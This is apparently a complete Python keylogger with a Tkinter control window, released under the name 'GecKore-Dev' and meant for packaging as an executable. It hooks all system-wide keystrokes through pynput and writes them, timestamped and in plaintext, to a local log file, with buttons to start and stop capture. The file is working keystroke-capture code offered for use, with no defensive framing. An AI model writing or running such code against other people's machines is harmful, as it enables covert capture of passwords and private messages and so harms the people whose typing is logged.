#  _____           _   __               
# |  __ \         | | / /               
# | |  \/ ___  ___| |/ /  ___  _ __ ___ 
# | | __ / _ \/ __|    \ / _ \| '__/ _ \
# | |_\ \  __/ (__| |\  \ (_) | | |  __/
#  \____/\___|\___\_| \_/\___/|_|  \___|
#                                       
# Nom du fichier : keylogger.py
# Version       : 1.0.0
# Auteur        : GecKore-Dev
# GitHub        : https://github.com/GecKore-Dev
#

from pynput.keyboard import Listener, Key
import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import threading
import datetime
import time
import os
import sys
import webbrowser

# Fonction pour obtenir le chemin des ressources (logo inclus dans le .exe)
def get_resource_path(relative_path):
    """Obtenir le chemin absolu d'un fichier même après la compilation avec PyInstaller."""
    try:
        base_path = sys._MEIPASS  # Lorsqu'on exécute l'exécutable compilé
    except AttributeError:
        base_path = os.path.abspath(".")  # Lorsqu'on exécute le script directement
    return os.path.join(base_path, relative_path)

# Variable globale pour activer/désactiver le keylogger
is_running = False
last_key_time = time.time()  # Horodatage de la dernière frappe
pause_interval = 2  # Temps de pause en secondes pour insérer un horodatage

# Fichier où les frappes seront enregistrées
log_file = "keylog.txt"

# Informations du projet
VERSION = "1.0.0"
AUTHOR = "GecKore-Dev"
GITHUB_URL = "https://github.com/GecKore-Dev"

# Chemin des ressources
logo_path = get_resource_path("Geckore/Logo-GecKore.png")
icon_path = get_resource_path("Geckore/Icon-GecKore.ico")  # Ajout de l'icône

def log_key(key):
    """Fonction pour enregistrer les frappes au clavier avec horodatage après une pause."""
    global last_key_time

    # Vérifie si une pause s'est écoulée
    current_time = time.time()
    if current_time - last_key_time > pause_interval:
        with open(log_file, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("\n[%Y-%m-%d %H:%M:%S] ")
            f.write(timestamp)  # Ajoute un horodatage avant d'enregistrer les nouvelles frappes
    
    last_key_time = current_time  # Met à jour l'heure de la dernière frappe

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            if key == Key.space:
                f.write(" ")  # Ajoute un espace pour la touche espace
            elif key == Key.enter:
                f.write("\n")  # Ajoute un saut de ligne pour la touche entrée
            elif hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Ajoute le caractère directement
            else:
                f.write(f" [{key}] ")  # Ajoute les touches spéciales entre crochets
    except Exception as e:
        print(f"Erreur lors de l'enregistrement de la touche : {e}")

def on_press(key):
    """Appelé lorsqu'une touche est enfoncée."""
    if is_running:
        log_key(key)

def start_keylogger():
    """Démarre le keylogger dans un thread séparé."""
    global is_running
    is_running = True
    messagebox.showinfo("Keylogger", "Le keylogger est activé.")  # Message pour activation
    threading.Thread(target=run_listener, daemon=True).start()

def stop_keylogger():
    """Arrête le keylogger."""
    global is_running
    is_running = False
    messagebox.showinfo("Keylogger", "Le keylogger est désactivé.")  # Message pour désactivation

def run_listener():
    """Lance l'écoute des frappes clavier."""
    with Listener(on_press=on_press) as listener:
        listener.join()

def open_github(event):
    """Ouvre le lien GitHub dans le navigateur."""
    webbrowser.open_new(GITHUB_URL)

# Interface graphique avec Tkinter
def create_gui():
    """Crée une interface graphique pour contrôler le keylogger."""
    root = tk.Tk()
    root.title("Keylogger by GecKore")

    # Définir l'icône pour l'interface
    root.iconbitmap(icon_path)

    # Dimensions de l'interface
    root.geometry("500x400")

    # Ajout du logo
    try:
        img = Image.open(logo_path)
        # Utilisation de Resampling pour les versions récentes de Pillow
        img = img.resize((150, 150), Image.Resampling.LANCZOS)  
        logo = ImageTk.PhotoImage(img)
        logo_label = tk.Label(root, image=logo)
        logo_label.image = logo  # Référence pour éviter le garbage collector
        logo_label.pack(pady=10)
    except Exception as e:
        print(f"Erreur lors du chargement du logo : {e}")
        messagebox.showerror("Erreur", f"Impossible de charger le logo : {e}")

    # Ajout des informations sur l'auteur
    info_label = tk.Label(root, text=f"Auteur : {AUTHOR}\nVersion : {VERSION}", font=("Arial", 12), justify="center")
    info_label.pack(pady=10)

    # Lien GitHub cliquable
    github_label = tk.Label(root, text="Profil GitHub GecKore", font=("Arial", 12), fg="blue", cursor="hand2")
    github_label.pack(pady=5)
    github_label.bind("<Button-1>", open_github)  # Rendre le lien cliquable

    # Boutons pour activer et désactiver
    start_button = tk.Button(root, text="Activer Keylogger", command=start_keylogger, bg="green", fg="white", font=("Arial", 12))
    start_button.pack(pady=10)

    stop_button = tk.Button(root, text="Désactiver Keylogger", command=stop_keylogger, bg="red", fg="white", font=("Arial", 12))
    stop_button.pack(pady=10)

    # Affiche l'interface
    root.mainloop()

# Lancer l'interface graphique
if __name__ == "__main__":
    create_gui()
